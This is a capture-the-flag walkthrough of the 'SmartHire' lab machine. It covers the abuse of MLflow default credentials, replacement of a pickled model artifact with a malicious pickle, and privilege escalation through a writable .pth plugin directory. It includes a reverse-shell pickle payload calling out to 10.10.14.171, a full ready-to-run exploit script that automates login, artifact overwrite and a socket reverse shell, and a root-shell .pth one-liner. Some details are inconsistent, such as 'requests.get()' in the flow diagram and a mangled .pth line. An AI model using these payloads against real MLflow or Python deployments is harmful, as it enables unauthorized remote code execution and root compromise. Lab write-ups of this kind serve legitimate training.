# SmartHire

**Machine:** SmartHire\
**OS:** Linux\
**Difficulty:** Medium

***

### Overview

SmartHire is a Linux machine built around a web application and an MLflow machine-learning infrastructure.

The attack chain is:

```
Web Enumeration
      ↓
models.smarthire.htb
      ↓
MLflow
      ↓
Default Credentials
      ↓
MLflow Model Artifact
      ↓
Python Pickle Deserialization
      ↓
Foothold as svcweb
      ↓
Python 3.10 Environment
      ↓
Privilege Escalation
      ↓
Root
```

The interesting part of the machine is the abuse of an MLflow-hosted Python model. The application loads a serialized `pickle` model, allowing a malicious pickle to achieve code execution.

***

## 1. Reconnaissance

I started with a full TCP port scan:

```bash
nmap -p- --min-rate 10000 <TARGET_IP>
```

I then enumerated the discovered services:

```bash
nmap -p 22,80 -sCV <TARGET_IP>
```

The web application was hosted on:

```
smarthire.htb
```

I added the hostname to `/etc/hosts`:

```bash
echo "<TARGET_IP> smarthire.htb" | sudo tee -a /etc/hosts
```

***

## 2. Web Enumeration

The main website exposed functionality related to the SmartHIRE recruitment application.

I enumerated the web application and its virtual hosts.

```bash
ffuf -u http://smarthire.htb/ \
     -H 'Host: FUZZ.smarthire.htb' \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -ac
```

This revealed:

```
models.smarthire.htb
```

I added the new hostname:

```bash
echo "<TARGET_IP> models.smarthire.htb" | sudo tee -a /etc/hosts
```

***

## 3. MLflow

Visiting:

```
http://models.smarthire.htb
```

revealed an MLflow instance.

The MLflow API required authentication.

During enumeration, the credentials:

```
admin:password
```

were found to work.

I could therefore interact with the MLflow artifact API.

***

## 4. Enumerating the Application Data

The SmartHIRE application worked with candidate information in CSV format.

The expected structure was:

```csv
name,skills,experience,education,position_applied,previous_company
John Smith,"Python, Machine Learning, SQL",60,Master's in CS,Data Scientist,TechCorp
Sarah Johnson,"JavaScript, React, Node.js",36,Bachelor's in SE,Full Stack Dev,StartupXYZ
Mike Brown,"Java, Spring Boot, PostgreSQL",84,Bachelor's in IT,Backend Developer,Enterprise Inc
```

The application used a machine-learning model stored in MLflow.

***

## 5. Downloading the Model Artifact

The model artifact could be accessed through the MLflow artifact API.

I downloaded the Python model:

```bash
curl -u admin:password -o - \
http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/32ab8e5f6f9c4768ba9d8739dec1616b/artifacts/model/python_model.pkl
```

The important file was:

```
python_model.pkl
```

This immediately suggested investigating how the application loaded the model.

***

## 6. Python Version Enumeration

I enumerated the environment and got to know that foothold has py version 3.10

***

## 7. Understanding Python Pickle

The model was serialized using Python's `pickle` mechanism.

Pickle is dangerous when untrusted data is deserialized because it is capable of invoking functions during object reconstruction.

The key mechanism is the `__reduce__()` method.

A malicious object can specify:

```python
def __reduce__(self):
    return some_function, (arguments,)
```

When Python later deserializes the object, the specified function can be invoked.

This gives us a code-execution primitive.

***

## 8. Creating the Malicious Pickle

I created the following payload:

```python
import pickle, os

class Payload:
    def __reduce__(self):
        return os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.14.171/9001 0>&1'",)

with open("payload1.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

The resulting execution flow is:

```
payload.pkl
     ↓
pickle.load()
     ↓
Payload.__reduce__()
     ↓
os.system
     ↓
10.10.14.171:9001
```

The `os` import is not required for this particular payload.

***

## 9. Generating the Payload with Python 3.10

Because the target environment was running Python 3.10, I generated the pickle using the same Python version.

Using `uv`:

```bash
uv run --with requests --python 3.10 payload.py
```

This generated:

```
payload.pkl
```

The important point is that `uv` lets us explicitly select Python 3.10 rather than relying on whatever Python version happens to be installed on Kali.

***

## 10. Replacing the MLflow Model

The vulnerable model artifact was:

```
model/python_model.pkl
```

The original artifact could be accessed using:

```bash
curl -u admin:password -o - \
http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/32ab8e5f6f9c4768ba9d8739dec1616b/artifacts/model/python_model.pkl
```

The malicious pickle was then used in place of the original model artifact.

The objective was to make the SmartHIRE application load our malicious object when it subsequently loaded the model.

***

## 11. Triggering the Deserialization

The `/predict` functionality causes the application to load the machine-learning model.

Therefore, after replacing the model artifact, accessing the prediction functionality causes the application to deserialize our malicious pickle.

The chain becomes:

```
/predict
   ↓
Load ML model
   ↓
Load python_model.pkl
   ↓
pickle deserialization
   ↓
__reduce__()
   ↓
requests.get()
```

This provides code execution in the context of the application.

The resulting foothold was obtained as:

```
svcweb
```

***

if this doesnt work then you can use:

```bash
#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║       SmartHire - MLflow Pickle Deserialization RCE  ║
║                                                      ║
║       Author  : maverick-vf142                       ║
║       HTB     : SmartHire                            ║
║       CVE     : Pickle Deserialization via MLflow    ║
╚══════════════════════════════════════════════════════╝

Usage: python3 exploit.py <LHOST> <LPORT> [--target <URL>] [--mlflow <URL>]

All credentials and targets are prompted or passed as args — nothing hardcoded.
"""

import pickle
import os
import sys
import argparse
import getpass
import requests

# ── Argument parsing ──────────────────────────────────────────────────────────
parser = argparse.ArgumentParser(description="SmartHire MLflow RCE")
parser.add_argument("lhost",   help="Your listener IP")
parser.add_argument("lport",   help="Your listener port")
parser.add_argument("--target", default="http://smarthire.htb",        help="Target app URL")
parser.add_argument("--mlflow", default="http://models.smarthire.htb", help="MLflow URL")
args = parser.parse_args()

LHOST  = args.lhost
LPORT  = args.lport
TARGET = args.target.rstrip("/")
MLFLOW = args.mlflow.rstrip("/")

TRAIN_CSV = b"name,skills,experience,education,position_applied,previous_company\nAlice,Python,48,Masters,Eng,Corp\nBob,Java,72,Bachelors,Dev,Inc\n"
PRED_CSV  = b"name,skills,experience,education,position_applied,previous_company\nTest,Python,24,Bachelors,Eng,Co\n"

print("╔══════════════════════════════════════════════════════╗")
print("║     SmartHire - MLflow Pickle Deserialization RCE    ║")
print("║                  by maverick-vf142                   ║")
print("╚══════════════════════════════════════════════════════╝")
print(f"[*] Target  : {TARGET}")
print(f"[*] MLflow  : {MLFLOW}")
print(f"[*] Listener: {LHOST}:{LPORT}")
print()

# ── App credentials ───────────────────────────────────────────────────────────
print("[*] App credentials (needs upload/admin role):")
app_user = input("    Username : ")
app_pass = getpass.getpass("    Password : ")

# ── MLflow credentials ────────────────────────────────────────────────────────
print("\n[*] MLflow credentials (press Enter to use defaults admin/password):")
ml_user  = input("    MLflow username [admin]   : ").strip() or "admin"
ml_pass  = getpass.getpass("    MLflow password [password]: ") or "password"
MLCREDS  = (ml_user, ml_pass)
print()

# ── Pickle payload ────────────────────────────────────────────────────────────
class ReverseShell:
    def __reduce__(self):
        cmd = (
            f"python3 -c '"
            f"import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{LHOST}\",{LPORT}));"
            f"os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/bash\",\"-i\"])'"
        )
        return (os.system, (cmd,))

payload = pickle.dumps(ReverseShell())
print(f"[+] Pickle payload built ({len(payload)} bytes)")

# ── Login ─────────────────────────────────────────────────────────────────────
print(f"[*] Logging in as '{app_user}'...")
sess = requests.Session()
r = sess.post(f"{TARGET}/login",
              data={"username": app_user, "password": app_pass},
              allow_redirects=True)

if "dashboard" not in r.url:
    print(f"[!] Login failed — landed at: {r.url}")
    print(f"    HTTP {r.status_code} | Check credentials or --target")
    sys.exit(1)
print(f"[+] Login OK — session active")

# ── Upload training CSV ───────────────────────────────────────────────────────
print("[*] Uploading training CSV to register a new MLflow model version...")
r = sess.post(f"{TARGET}/upload_hiring_data",
              files={"file": ("train.csv", TRAIN_CSV, "text/csv")})

if "login" in r.url:
    print("[!] Redirected to login — this account lacks upload/admin permissions")
    sys.exit(1)

if r.status_code != 200:
    print(f"[!] Upload failed: HTTP {r.status_code} | {r.text[:300]}")
    sys.exit(1)

try:
    version = r.json().get("model_info", {}).get("version", "?")
except requests.exceptions.JSONDecodeError:
    print(f"[!] Non-JSON response from /upload_hiring_data:")
    print(f"    {r.text[:400]}")
    sys.exit(1)

print(f"[+] Registered model version: {version}")

# ── Grab latest run_id from MLflow ────────────────────────────────────────────
print("[*] Fetching latest run_id from MLflow API...")
r = requests.post(
    f"{MLFLOW}/api/2.0/mlflow/runs/search",
    json={"experiment_ids": ["0"], "max_results": 1},
    auth=MLCREDS
)

if r.status_code == 401:
    print("[!] MLflow auth failed — wrong MLflow credentials")
    sys.exit(1)

try:
    run_id = r.json()["runs"][0]["info"]["run_id"]
except (KeyError, IndexError):
    print(f"[!] Could not parse run_id:\n    {r.text[:300]}")
    sys.exit(1)

print(f"[+] run_id: {run_id}")

# ── Overwrite python_model.pkl ────────────────────────────────────────────────
print("[*] Replacing python_model.pkl with malicious pickle...")
artifact_url = (
    f"{MLFLOW}/api/2.0/mlflow-artifacts/artifacts"
    f"/0/{run_id}/artifacts/model/python_model.pkl"
)
r = requests.put(artifact_url, data=payload, auth=MLCREDS,
                 headers={"Content-Type": "application/octet-stream"})

if r.status_code != 200:
    print(f"[!] Artifact upload failed: HTTP {r.status_code} | {r.text[:300]}")
    sys.exit(1)

print(f"[+] Malicious pickle uploaded successfully")

# ── Trigger /predict → executes pickle → reverse shell ───────────────────────
print(f"\n[!] Start your listener now:  nc -lvnp {LPORT}")
input("[*] Press Enter when your listener is ready...")

print(f"[*] Triggering /predict ...")
try:
    sess.post(f"{TARGET}/predict",
              files={"file": ("pred.csv", PRED_CSV, "text/csv")},
              timeout=20)
except requests.exceptions.Timeout:
    pass  # expected — shell holds the connection open

print("[+] Done — check your listener for a shell.")
print("    If nothing arrived, the box may block outbound TCP.")
```

## 12. Foothold Enumeration

Once inside the machine, I started enumerating the environment:

```bash
whoami
id
hostname
pwd
```

The Python environment was particularly interesting:

```bash
python3 --version
```

which returned:

```
Python 3.10
```

This confirmed the Python runtime that was relevant to the exploitation chain.

***

## 13. Privilege Escalation Enumeration

### Privilege Escalation

With the foothold as `svcweb`, I started looking for a way to escalate privileges.

First, I checked the available sudo permissions:

```
sudo -l
```

This revealed that I could execute the MLflow management script as `root`.

I inspected the script:

```
cat /opt/tools/mlflow_ctl/mlflowctl.py
```

The script uses Python's `site.addsitedir()` to load the development plugin directory:

```
/opt/tools/mlflow_ctl/plugins/dev/
```

The important detail is that this directory is **writable by `svcweb`**.

#### Abusing `.pth` Files

Python automatically processes `.pth` files when `site.addsitedir()` is called. A `.pth` file containing an `import` statement can therefore execute Python code.

Since `svcweb` can write to the plugin directory, I created a malicious `.pth` file:

```
echo 'import os; os.system("/bin/bash -p")' > /opt/tools/mlflow_ctl/plugins/dev/evil.pth
```

The payload:

```
import osos.system("/bin/bash -p")
```

launches a privileged Bash shell.

I then triggered the vulnerable script through the sudo permission:

```
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

Because the script runs as `root` and calls `site.addsitedir()` on the writable plugin directory, Python processes `evil.pth` and executes the embedded import.

This gives a root shell.

I verified the privilege escalation with:

```
whoami
```

which returned:

```
root
```

Finally, I retrieved the root flag:

```
cat /root/root.txt
```

#### Privilege Escalation Chain

```
svcweb
   ↓
sudo -l
   ↓
mlflowctl.py executable as root
   ↓
site.addsitedir()
   ↓
/opt/tools/mlflow_ctl/plugins/dev/
   ↓
Writable by svcweb
   ↓
evil.pth
   ↓
Python executes import
   ↓
/bin/bash -p
   ↓
root
```

